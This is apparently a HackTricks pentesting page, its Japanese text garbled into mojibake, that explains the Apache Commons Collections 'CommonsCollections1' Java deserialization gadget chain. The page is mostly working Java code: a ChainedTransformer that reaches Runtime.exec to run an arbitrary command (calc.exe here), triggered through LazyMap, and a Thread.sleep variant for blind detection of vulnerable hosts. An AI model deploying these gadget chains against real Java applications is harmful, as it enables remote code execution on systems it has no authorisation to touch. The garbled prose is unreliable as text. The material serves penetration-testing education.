# CommonsCollection1 ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ - Java Transformersã‚’ä½¿ç”¨ã—ãŸRutime exec()ã¨Thread Sleep

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã¾ã—ã‚‡ã†ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>

## Java Transformersã‚’ä½¿ç”¨ã—ãŸRutime exec()

ã„ãã¤ã‹ã®å ´æ‰€ã§ã€æ¬¡ã®ã‚ˆã†ãªApache common collectionsã®ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒã‚’ä½¿ç”¨ã—ãŸJavaé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1PayloadOnly {
public static void main(String... args) {
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Runtime.class), //(1)
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
), //(2)
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
), //(3)
new InvokerTransformer("exec",
new Class[]{String.class},
command
) //(4)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");
}
}
```
Javaã®é€†ã‚·ãƒªã‚¢ãƒ«åŒ–ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã«ã¤ã„ã¦ä½•ã‚‚çŸ¥ã‚‰ãªã„å ´åˆã€ã“ã®ã‚³ãƒ¼ãƒ‰ãŒãªãœcalcã‚’å®Ÿè¡Œã™ã‚‹ã®ã‹ã‚’ç†è§£ã™ã‚‹ã®ã¯é›£ã—ã„ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚

ã¾ãšæœ€åˆã«çŸ¥ã£ã¦ãŠãå¿…è¦ãŒã‚ã‚‹ã®ã¯ã€**Javaã®Transformer**ã¯ã€**ã‚¯ãƒ©ã‚¹ã‚’å—ã‘å–ã‚Šã€åˆ¥ã®ã‚¯ãƒ©ã‚¹ã«å¤‰æ›ã™ã‚‹**ã‚‚ã®ã§ã™ã€‚
ã¾ãŸã€ã“ã“ã§**å®Ÿè¡Œã•ã‚Œã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰**ã¯ã€ä»¥ä¸‹ã¨**åŒç­‰**ã§ã™ï¼š
```java
Runtime.getRuntime().exec(new String[]{"calc.exe"});
```
ã‚‚ã£ã¨æ­£ç¢ºã«è¨€ãˆã°ã€æœ€çµ‚çš„ã«å®Ÿè¡Œã•ã‚Œã‚‹ã®ã¯æ¬¡ã®ã‚ˆã†ãªã‚‚ã®ã§ã™:
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
### æ–¹æ³•

ã§ã¯ã€æœ€åˆã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€Œå˜ç´”ãªã€ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã¨åŒç­‰ã§ã‚ã‚‹ã‹ã©ã†ã‹ã‚’è¦‹ã¦ã¿ã¾ã—ã‚‡ã†ã€‚

ã¾ãšã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§æ³¨æ„ã™ã¹ãç‚¹ã¯ã€**å¤‰æ›ã®ãƒã‚§ãƒ¼ãƒ³ï¼ˆé…åˆ—ï¼‰ãŒä½œæˆã•ã‚Œã¦ã„ã‚‹**ã“ã¨ã§ã™ï¼š
```java
String[] command = {"calc.exe"};
final Transformer[] transformers = new Transformer[]{
//(1) - Get gadget Class (from Runtime class)
new ConstantTransformer(Runtime.class),

//(2) - Call from gadget Class (from Runtime class) the function "getMetod" to obtain "getRuntime"
new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", new Class[0]}
),

//(3) - Call from (Runtime) Class.getMethod("getRuntime") to obtain a Runtime oject
new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
),

//(4) - Use the Runtime object to call exec with arbitrary commands
new InvokerTransformer("exec",
new Class[]{String.class},
command
)
};
ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
```
ã‚³ãƒ¼ãƒ‰ã‚’èª­ã‚€ã¨ã€é…åˆ—ã®å¤‰æ›ã‚’ä½•ã‚‰ã‹ã®æ–¹æ³•ã§é€£é–ã•ã›ã‚‹ã“ã¨ã§ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã§ãã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚

ã§ã¯ã€ã“ã‚Œã‚‰ã®å¤‰æ›ã¯ã©ã®ã‚ˆã†ã«é€£é–ã•ã‚Œã‚‹ã®ã§ã—ã‚‡ã†ã‹ï¼Ÿ
```java
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);
lazyMap.get("anything");
```
æœ€å¾Œã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€**Mapã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒä½œæˆ**ã•ã‚Œã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ãã®å¾Œã€`LazyMap`ã‹ã‚‰`decorate`é–¢æ•°ãŒå®Ÿè¡Œã•ã‚Œã€ãƒãƒƒãƒ—ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¨ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ãŒæ¸¡ã•ã‚Œã¾ã™ã€‚æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‹ã‚‰ã‚ã‹ã‚‹ã‚ˆã†ã«ã€ã“ã‚Œã«ã‚ˆã‚Š**ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼**ãŒ`lazyMap.factory`å±æ€§å†…ã«ã‚³ãƒ”ãƒ¼ã•ã‚Œã¾ã™ã€‚
```java
protected LazyMap(Map map, Transformer factory) {
super(map);
if (factory == null) {
throw new IllegalArgumentException("Factory must not be null");
}
this.factory = factory;
}
```
ãã—ã¦ã€ç´ æ™´ã‚‰ã—ã„ãƒ•ã‚£ãƒŠãƒ¼ãƒ¬ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ï¼š`lazyMap.get("anything");`

ã“ã‚ŒãŒ`get`é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™ï¼š
```java
public Object get(Object key) {
if (map.containsKey(key) == false) {
Object value = factory.transform(key);
map.put(key, value);
return value;
}
return map.get(key);
}
```
ãã—ã¦ã€ã“ã‚ŒãŒ`transform`é–¢æ•°ã®ã‚³ãƒ¼ãƒ‰ã§ã™ã€‚
```java
public Object transform(Object object) {
for (int i = 0; i < iTransformers.length; i++) {
object = iTransformers[i].transform(object);
}
return object;
}
```
ã—ãŸãŒã£ã¦ã€**factory**ã®ä¸­ã«ã¯**`chainedTransformer`**ãŒä¿å­˜ã•ã‚Œã¦ãŠã‚Šã€**`transform`**é–¢æ•°ã®ä¸­ã§ã¯ã€**ã™ã¹ã¦ã®ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‚’é †ç•ªã«å®Ÿè¡Œ**ã—ã¦ã„ã¾ã™ã€‚é¢ç™½ã„ã“ã¨ã«ã€**å„ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã¯`object`ã‚’å…¥åŠ›ã¨ã—ã¦ä½¿ç”¨**ã—ã¦ãŠã‚Šã€**ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã¯å‰ã«å®Ÿè¡Œã•ã‚ŒãŸæœ€å¾Œã®ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã®å‡ºåŠ›**ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€**ã™ã¹ã¦ã®ãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒ ã¯ã€æ‚ªæ„ã®ã‚ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ãƒã‚§ãƒ¼ãƒ³ã•ã‚Œã¦ã„ã¾ã™**ã€‚

### æ¦‚è¦

æœ€çµ‚çš„ã«ã¯ã€lazyMapãŒgetãƒ¡ã‚½ãƒƒãƒ‰å†…ã§ãƒã‚§ãƒ¼ãƒ³ã•ã‚ŒãŸãƒˆãƒ©ãƒ³ã‚¹ãƒ•ã‚©ãƒ¼ãƒãƒ¼ã‚’ç®¡ç†ã™ã‚‹æ–¹æ³•ã®ãŸã‚ã€æ¬¡ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã—ã¦ã„ã‚‹ã‹ã®ã‚ˆã†ã§ã™ï¼š
```java
Object value = "someting";

value = new ConstantTransformer(Runtime.class).transform(value); //(1)

value = new InvokerTransformer("getMethod",
new Class[]{ String.class, Class[].class},
new Object[]{"getRuntime", null}
).transform(value); //(2)

value = new InvokerTransformer("invoke",
new Class[]{Object.class, Object[].class},
new Object[]{null, new Object[0]}
).transform(value); //(3)

value = new InvokerTransformer("exec",
new Class[]{String.class},
command
).transform(value); //(4)
```
_æ³¨æ„ã—ã¦ãã ã•ã„ã€`value`ã¯å„å¤‰æ›ã®å…¥åŠ›ã§ã‚ã‚Šã€å‰ã®å¤‰æ›ã®å‡ºåŠ›ã§ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ãƒ¯ãƒ³ãƒ©ã‚¤ãƒŠãƒ¼ã®å®Ÿè¡ŒãŒå¯èƒ½ã«ãªã‚Šã¾ã™:_
```java
((Runtime) (Runtime.class.getMethod("getRuntime").invoke(null))).exec(new String[]{"calc.exe"});
```
ã“ã“ã§ã¯ã€**ComonsCollections1** ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã§ä½¿ç”¨ã•ã‚Œã‚‹ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒèª¬æ˜ã•ã‚Œã¦ã„ã¾ã™ã€‚ã—ã‹ã—ã€**ã“ã‚ŒãŒã©ã®ã‚ˆã†ã«å®Ÿè¡Œã•ã‚Œã‚‹ã‹ã¯èª¬æ˜ã•ã‚Œã¦ã„ã¾ã›ã‚“**ã€‚[ã“ã“ã§ **ysoserial**](https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java)ã‚’è¦‹ã‚‹ã¨ã€ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã€`AnnotationInvocationHandler` ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆã‚’ä½¿ç”¨ã—ã¦ã„ã‚‹ã“ã¨ãŒã‚ã‹ã‚Šã¾ã™ã€‚ã“ã®ã‚ªãƒ–ã‚¸ã‚§ã‚¯ãƒˆãŒé€†ã‚·ãƒªã‚¢ãƒ«åŒ–ã•ã‚Œã‚‹ã¨ã€`payload.get()` é–¢æ•°ãŒå‘¼ã³å‡ºã•ã‚Œã€ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰å…¨ä½“ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

## Javaã‚¹ãƒ¬ãƒƒãƒ‰ã®ã‚¹ãƒªãƒ¼ãƒ—

ã“ã®ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã¯ã€**ã‚¦ã‚§ãƒ–ãŒè„†å¼±ã‹ã©ã†ã‹ã‚’ç‰¹å®šã™ã‚‹ã®ã«ä¾¿åˆ©**ã§ã‚ã‚Šã€è„†å¼±ã§ã‚ã‚‹å ´åˆã«ã¯ã‚¹ãƒªãƒ¼ãƒ—ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚
```java
import org.apache.commons.*;
import org.apache.commons.collections.*;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.*;
import java.io.*;
import java.lang.reflect.InvocationTargetException;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.Map;
import java.util.HashMap;

public class CommonsCollections1Sleep {
public static void main(String... args) {
final Transformer[] transformers = new Transformer[]{
new ConstantTransformer(Thread.class),
new InvokerTransformer("getMethod",
new Class[]{
String.class, Class[].class
},
new Object[]{
"sleep", new Class[]{Long.TYPE}
}),
new InvokerTransformer("invoke",
new Class[]{
Object.class, Object[].class
}, new Object[]
{
null, new Object[] {7000L}
}),
};

ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
Map map = new HashMap<>();
Map lazyMap = LazyMap.decorate(map, chainedTransformer);

//Execute gadgets
lazyMap.get("anything");

}
}
```
## ã‚‚ã£ã¨ã‚¬ã‚¸ã‚§ãƒƒãƒˆ

ã“ã“ã§ã•ã‚‰ã«ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š[https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html](https://deadcode.me/blog/2016/09/02/Blind-Java-Deserialization-Commons-Gadgets.html)

##

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* **ã‚µã‚¤ãƒãƒ¼ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ä¼æ¥­ã§åƒã„ã¦ã„ã¾ã™ã‹ï¼Ÿ** **HackTricksã§ä¼šç¤¾ã‚’å®£ä¼**ã—ãŸã„ã§ã™ã‹ï¼Ÿã¾ãŸã¯ã€**PEASSã®æœ€æ–°ãƒãƒ¼ã‚¸ãƒ§ãƒ³ã«ã‚¢ã‚¯ã‚»ã‚¹ã—ãŸã‚Šã€HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰**ã—ãŸã„ã§ã™ã‹ï¼Ÿ[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’è¦‹ã¤ã‘ã¦ãã ã•ã„ã€‚ç‹¬å çš„ãª[**NFT**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã§ã™ã€‚
* [**å…¬å¼ã®PEASSï¼†HackTricksã®ã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’æ‰‹ã«å…¥ã‚Œã¾ã—ã‚‡ã†ã€‚
* [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«**å‚åŠ **ã™ã‚‹ã‹ã€**Twitter**ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã—ã¦ãã ã•ã„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[hacktricksã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks)ã¨[hacktricks-cloudã®ãƒªãƒã‚¸ãƒˆãƒª](https://github.com/carlospolop/hacktricks-cloud)**ã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚

</details>
